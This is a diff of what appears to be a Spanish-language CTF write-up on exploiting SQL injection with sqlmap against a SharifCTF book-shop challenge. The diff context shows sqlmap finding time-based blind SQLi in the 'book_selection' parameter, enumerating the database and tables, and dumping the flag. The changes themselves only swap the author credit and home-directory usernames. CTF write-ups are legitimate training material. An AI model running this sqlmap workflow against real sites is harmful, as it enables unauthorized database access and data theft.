@@ -6,7 +6,7 @@
 |___/\__, |_|_| |_| |_|\__,_| .__/ 
         |_|                 |_|    
 		
-by IPI
+by sn4fu
 
 * sqlmap 
 
@@ -500,20 +500,20 @@ Parameter: book_selection (POST)
 [23:09:14] [INFO] the back-end DBMS is MySQL
 web application technology: Nginx
 back-end DBMS: MySQL >= 5.0.12
-[23:09:14] [INFO] fetched data logged to text files under '/home/isma/.sqlmap/output/ctf.sharif.edu'
+[23:09:14] [INFO] fetched data logged to text files under '/home/sn4fu/.sqlmap/output/ctf.sharif.edu'
 
 [*] shutting down at 23:09:14
 
 -- sqlmap ha descubierto que la entrada 'book_selection' es vulnerable a 'AND/OR time-based blind' SQLi.
 -- Observamos que se ha guardado información adicional, que sqlmap usará para actividades posteriores:
 
-# ls -al /home/isma/.sqlmap/output/ctf.sharif.edu
+# ls -al /home/sn4fu/.sqlmap/output/ctf.sharif.edu
 total 24
-drwxr-xr-x 2 isma isma 4096 Dec 18 23:09 .
-drwxr-xr-x 3 isma isma 4096 Dec 18 23:01 ..
--rw-r--r-- 1 isma isma  326 Dec 18 23:09 log
--rw-r--r-- 1 isma isma 8192 Dec 18 23:09 session.sqlite
--rw-r--r-- 1 isma isma   52 Dec 18 23:01 target.txt
+drwxr-xr-x 2 sn4fu sn4fu 4096 Dec 18 23:09 .
+drwxr-xr-x 3 sn4fu sn4fu 4096 Dec 18 23:01 ..
+-rw-r--r-- 1 sn4fu sn4fu  326 Dec 18 23:09 log
+-rw-r--r-- 1 sn4fu sn4fu 8192 Dec 18 23:09 session.sqlite
+-rw-r--r-- 1 sn4fu sn4fu   52 Dec 18 23:01 target.txt
 
 
 ----------------------------------------------------------------------------------------------------
@@ -562,7 +562,7 @@ back-end DBMS: MySQL >= 5.0.0
 available databases [1]:
 [*] book_shop
 
-[23:25:11] [INFO] fetched data logged to text files under '/home/isma/.sqlmap/output/ctf.sharif.edu'
+[23:25:11] [INFO] fetched data logged to text files under '/home/sn4fu/.sqlmap/output/ctf.sharif.edu'
 
 [*] shutting down at 23:25:11
 
@@ -629,7 +629,7 @@ Database: book_shop
 | owned_books |
 +-------------+
 
-[23:41:18] [INFO] fetched data logged to text files under '/home/isma/.sqlmap/output/ctf.sharif.edu'
+[23:41:18] [INFO] fetched data logged to text files under '/home/sn4fu/.sqlmap/output/ctf.sharif.edu'
 
 [*] shutting down at 23:41:18
 
@@ -714,7 +714,7 @@ Table: books
 | is_premium  | tinyint(1)   |
 +-------------+--------------+
 
-[00:28:24] [INFO] fetched data logged to text files under '/home/isma/.sqlmap/output/ctf.sharif.edu'
+[00:28:24] [INFO] fetched data logged to text files under '/home/sn4fu/.sqlmap/output/ctf.sharif.edu'
 
 [*] shutting down at 00:28:24
 
@@ -796,8 +796,8 @@ Table: books
 | SharifCTF{931b20ec7700a61e5d280888662757af} |
 +---------------------------------------------+
 
-[00:47:41] [INFO] table 'book_shop.books' dumped to CSV file '/home/isma/.sqlmap/output/ctf.sharif.edu/dump/book_shop/books.csv'
-[00:47:41] [INFO] fetched data logged to text files under '/home/isma/.sqlmap/output/ctf.sharif.edu'
+[00:47:41] [INFO] table 'book_shop.books' dumped to CSV file '/home/sn4fu/.sqlmap/output/ctf.sharif.edu/dump/book_shop/books.csv'
+[00:47:41] [INFO] fetched data logged to text files under '/home/sn4fu/.sqlmap/output/ctf.sharif.edu'
 
 [*] shutting down at 00:47:41
 
